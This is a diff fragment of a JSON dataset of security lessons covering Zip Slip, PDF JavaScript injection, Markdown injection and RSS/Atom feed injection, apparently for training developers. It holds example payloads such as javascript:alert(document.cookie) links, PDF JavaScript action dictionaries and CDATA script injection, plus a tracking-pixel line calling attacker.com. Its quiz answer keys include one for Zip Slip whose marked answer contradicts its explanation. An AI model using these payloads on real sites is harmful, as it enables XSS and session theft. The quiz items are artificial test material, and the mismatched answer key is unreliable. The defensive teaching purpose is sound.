+          "Zip Slip exploits path traversal within archive entry filenames during extraction — not URL or query parameters",
+          "Zip Slip only works on Linux",
+          "Zip Slip requires authentication"
+        ],
+        "correctIndex": 1,
+        "explanation": "Standard path traversal injects ../ into URL paths. Zip Slip embeds traversal sequences directly in archive entry filenames — the vulnerability occurs during extraction when libraries write files without validating entry paths."
+      }
+    ],
+    "interviewQuestions": [
+      {
+        "question": "What tools can you use to create a Zip Slip test payload?",
+        "answer": "Python: zipfile.ZipInfo() can set arbitrary entry filenames including ../ sequences. The evilarc tool (GitHub) creates archives with path traversal entries. Java: jar with crafted ZipEntry names. Always test only on authorized systems — verify the extraction library rejects or safely handles the crafted entry."
+      }
+    ]
+  },
+  {
+    "id": 76,
+    "slug": "pdf-js-injection",
+    "title": "PDF Injection (Embedded JavaScript)",
+    "category": "File & Archive Injection",
+    "family": "PDFi",
+    "severity": "Medium",
+    "cvss": 5.8,
+    "cwe": "CWE-79",
+    "owasp": "A03:2021 – Injection",
+    "shortDescription": "User-controlled data in generated PDFs injects JavaScript actions or URI schemes that execute when the PDF is opened in Adobe Reader.",
+    "tags": ["pdf", "javascript", "xss", "reportlab", "adobe"],
+    "theory": "PDF documents support JavaScript actions (/S/JavaScript), launch actions, and URI actions that execute when the document is opened or form fields are interacted with. Server-side PDF generators embedding unsanitized user input allow injection of PDF action dictionaries — enabling data exfiltration, SSRF, or phishing overlays.",
+    "howItWorks": "1. Application generates PDF report with user-supplied data.\n2. Attacker submits: John</w:p><</Type/Action/S/JavaScript/JS(app.alert(1))>>.\n3. PDF generator embeds raw string without escaping PDF metacharacters.\n4. PDF contains a JavaScript action dictionary.\n5. Victim opens PDF → Adobe Reader executes JavaScript alert.",
+    "impact": "• Data exfiltration via PDF form submission to attacker's server\n• SSRF from the PDF reader process\n• Phishing via PDF overlay forms",
+    "realWorldCVE": {
+      "id": "CVE-2021-21017",
+      "description": "Adobe Acrobat Reader heap buffer overflow via crafted PDF JavaScript allowing arbitrary code execution when a malicious PDF was opened.",
+      "year": 2021
+    },
+    "codeExample": {
+      "language": "python",
+      "vulnerable": "# ❌ VULNERABLE: Raw user input in PDF\nfrom reportlab.pdfgen import canvas\nfrom flask import request\n\n@app.route('/generate-pdf')\ndef generate_pdf():\n    name = request.args.get('name', '')\n    c = canvas.Canvas('output.pdf')\n    c.drawString(100, 750, f'Invoice for: {name}')  # Raw user input!\n    c.save()",
+      "secure": "# ✅ SECURE: Sanitize PDF metacharacters\nimport re\n\n@app.route('/generate-pdf')\ndef generate_pdf():\n    name = request.args.get('name', '')\n    safe_name = re.sub(r'[<>/\\\\%()]', '', name)[:100]\n    c = canvas.Canvas('output.pdf')\n    c.drawString(100, 750, f'Invoice for: {safe_name}')\n    c.save()"
+    },
+    "mitigation": [
+      "Sanitize user input before PDF embedding — strip PDF metacharacters (<, >, /, \\, %, (, ))",
+      "Use PDF libraries that treat user data as text content, not raw PDF syntax",
+      "Serve PDFs with Content-Disposition: attachment to force download, preventing in-browser JS execution"
+    ],
+    "quiz": [
+      {
+        "question": "What PDF feature enables JavaScript execution when opened?",
+        "options": [
+          "/S/Script action type",
+          "/S/JavaScript action type in annotation or page open action",
+          "PDF metadata fields",
+          "PDF bookmark names"
+        ],
+        "correctIndex": 1,
+        "explanation": "PDF supports /S/JavaScript action dictionaries triggered on document open (/OpenAction), page open (/AA /O), or widget field interaction — creating a persistent XSS-like vector in the PDF reader context."
+      }
+    ],
+    "interviewQuestions": [
+      {
+        "question": "How would you test for PDF injection in an authorized penetration test?",
+        "answer": "Submit PDF metacharacters in all input fields: <, >, /, %, (, ). Download the generated PDF and inspect with pdf-parser.py — look for injected /Action, /JavaScript, or /URI dictionaries. Open in Adobe Reader in a sandboxed VM and check if any JavaScript alert or network request fires."
+      }
+    ]
+  },
+  {
+    "id": 77,
+    "slug": "markdown-injection",
+    "title": "Markdown Injection",
+    "category": "Misc & Content Injection",
+    "family": "MARKDOWNi",
+    "severity": "Medium",
+    "cvss": 6.1,
+    "cwe": "CWE-79",
+    "owasp": "A03:2021 – Injection",
+    "shortDescription": "Markdown renderers allowing javascript: URIs or raw HTML enable stored XSS and data exfiltration via user-supplied content.",
+    "tags": ["markdown", "xss", "content-injection", "tracking-pixel"],
+    "theory": "Many Markdown renderers support inline HTML or don't sanitize link/image URL schemes — allowing injection of javascript: URIs in links, tracking pixels in images, or raw HTML with event handlers. Stored in a database, the payload executes for every user viewing the content.",
+    "howItWorks": "1. Application renders user Markdown using marked.js without sanitization.\n2. Attacker posts: [Click me](javascript:alert(document.cookie)).\n3. Renderer generates: <a href=\"javascript:alert(document.cookie)\">Click me</a>.\n4. No sanitization of javascript: URI — XSS fires on click.\n5. Stored variant: saved to DB, executes for all future viewers.",
+    "impact": "• Stored XSS for every user viewing the content\n• Session token theft via javascript: links\n• Covert tracking via embedded tracking pixels",
+    "realWorldCVE": {
+      "id": "CVE-2022-24065",
+      "description": "marked.js XSS via Markdown link injection — javascript: scheme links bypassed sanitization and executed in browser.",
+      "year": 2022
+    },
+    "codeExample": {
+      "language": "javascript",
+      "vulnerable": "// ❌ VULNERABLE: Markdown without link sanitization\nconst marked = require('marked');\n\napp.get('/post/:id', async (req, res) => {\n  const post = await db.getPost(req.params.id);\n  // Attacker: [Click](javascript:alert(document.cookie))\n  const html = marked.parse(post.content);  // javascript: URI rendered!\n  res.send(`<html><body>${html}</body></html>`);\n});",
+      "secure": "// ✅ SECURE: Sanitize rendered HTML with DOMPurify\nconst marked = require('marked');\nconst createDOMPurify = require('dompurify');\nconst { JSDOM } = require('jsdom');\nconst DOMPurify = createDOMPurify(new JSDOM('').window);\n\napp.get('/post/:id', async (req, res) => {\n  const post = await db.getPost(req.params.id);\n  const rawHtml = marked.parse(post.content);\n  const safeHtml = DOMPurify.sanitize(rawHtml, {\n    ALLOWED_URI_REGEXP: /^(https?|mailto):/i,\n    FORBID_TAGS: ['script', 'iframe', 'object'],\n  });\n  res.send(`<html><body>${safeHtml}</body></html>`);\n});"
+    },
+    "mitigation": [
+      "Sanitize rendered Markdown HTML with DOMPurify before injecting into the DOM",
+      "Reject javascript: and data: URI schemes in all Markdown link and image URLs",
+      "Apply Content Security Policy: default-src 'self' — blocks inline scripts even if XSS occurs"
+    ],
+    "quiz": [
+      {
+        "question": "Why is Markdown injection particularly dangerous?",
+        "options": [
+          "Markdown supports SQL queries",
+          "Markdown's simple syntax hides XSS — developers trust it more than raw HTML and apply less strict sanitization",
+          "Markdown bypasses firewalls",
+          "Markdown executes server-side"
+        ],
+        "correctIndex": 1,
+        "explanation": "Markdown appears safe and simple, leading developers to apply less strict sanitization. The [text](url) syntax directly maps to anchor href — allowing javascript: URIs without any HTML knowledge."
+      }
+    ],
+    "interviewQuestions": [
+      {
+        "question": "How does a Markdown tracking pixel attack work?",
+        "answer": "An attacker posts ![](https://attacker.com/pixel.gif?id=USER_ID). When any user views the page, their browser automatically loads the image — making a GET request revealing their IP address, User-Agent, and any query parameters. This enables covert tracking without any user interaction beyond page view."
+      }
+    ]
+  },
+  {
+    "id": 78,
+    "slug": "rss-atom-feed-injection",
+    "title": "RSS/Atom Feed Injection",
+    "category": "Misc & Content Injection",
+    "family": "FEEDi",
+    "severity": "Medium",
+    "cvss": 5.8,
+    "cwe": "CWE-91",
+    "owasp": "A03:2021 – Injection",
+    "shortDescription": "Unescaped user content in RSS/Atom XML feeds injects malicious entries, script tags, or javascript: links executing in RSS reader applications.",
+    "tags": ["rss", "atom", "xml-injection", "feed", "xss"],
+    "theory": "RSS and Atom are XML-based syndication formats. When applications generate feed files with user-controlled content (titles, descriptions) without proper XML escaping, attackers inject XML metacharacters to add new feed entries, inject CDATA blocks with script tags, or add feed items with javascript: URI links. RSS readers and browser feed renderers may execute these payloads.",
+    "howItWorks": "1. Application generates RSS: <title> + postTitle + </title>.\n2. Attacker posts: My Blog</title><title><![CDATA[</title><script>alert(1)</script>]]></title>.\n3. RSS XML includes injected CDATA block with script tag.\n4. RSS reader renders feed and executes the script.\n5. Or inject: <link>javascript:alert(1)</link> — fires when link clicked.",
+    "impact": "• Stored XSS in RSS readers affecting all feed subscribers\n• Feed content spoofing — inject fake news entries\n• XML structure manipulation breaking the feed",
+    "realWorldCVE": {
+      "id": "CVE-2020-28852",
+      "description": "xml-js npm package XML injection via unsanitized input in generated XML/RSS documents, affecting Node.js applications building RSS feeds with user content.",
+      "year": 2020
+    },
+    "codeExample": {
+      "language": "javascript",
+      "vulnerable": "// ❌ VULNERABLE: Building RSS feed via string concatenation\napp.get('/feed.xml', async (req, res) => {\n  const posts = await db.getPosts();\n  let rss = '<?xml version=\"1.0\"?><rss version=\"2.0\"><channel>';\n  for (const post of posts) {\n    // Attacker title: My Blog</title><item><title>FAKE NEWS</title>\n    rss += `<item><title>${post.title}</title></item>`;\n  }\n  rss += '</channel></rss>';\n  res.type('application/rss+xml').send(rss);\n});",
+      "secure": "// ✅ SECURE: Use XML builder with automatic escaping\nconst xmlbuilder = require('xmlbuilder');\n\napp.get('/feed.xml', async (req, res) => {\n  const posts = await db.getPosts();\n  const root = xmlbuilder.create('rss').att('version', '2.0').ele('channel');\n  for (const post of posts) {\n    const item = root.ele('item');\n    item.ele('title').txt(post.title);  // .txt() auto-escapes XML metacharacters\n    item.ele('link').txt(post.url);\n  }\n  res.type('application/rss+xml').send(root.end({ pretty: true }));\n});"
+    },
+    "mitigation": [
+      "Use an XML builder library with automatic escaping — never string concatenation for XML/RSS",
+      "Validate feed content against the RSS 2.0 or Atom 1.0 XML Schema before serving",
+      "Apply Content Security Policy headers on the feed endpoint to restrict script execution in consuming browsers"
+    ],
+    "quiz": [
+      {
+        "question": "How does CDATA injection bypass XML restrictions in RSS feeds?",
+        "options": [
+          "CDATA disables RSS validation",
+          "CDATA sections are literal character data — <script> inside CDATA won't break XML parsing but may render as HTML in feed UIs",
+          "CDATA is a base64 format",
+          "CDATA bypasses TLS"
+        ],
+        "correctIndex": 1,
+        "explanation": "XML CDATA sections (<![CDATA[...]]>) are literal data not subject to XML escaping. Content like </title><script>alert(1)</script> inside CDATA won't break XML parsing but may render as HTML in RSS reader UIs that display feed content without sanitization."
+      }
+    ],
+    "interviewQuestions": [
+      {
+        "question": "Why are RSS feed injection attacks particularly effective against technical users?",
+        "answer": "Technical users and developers subscribe to RSS feeds for news, blog updates, and security advisories — often in RSS reader applications with fewer security controls than browsers (no CSP, less rigorous sandbox). A feed injection targeting a popular security blog could compromise the systems of security-conscious developers who are otherwise well-defended."
+      }
+    ]
   }
 ];
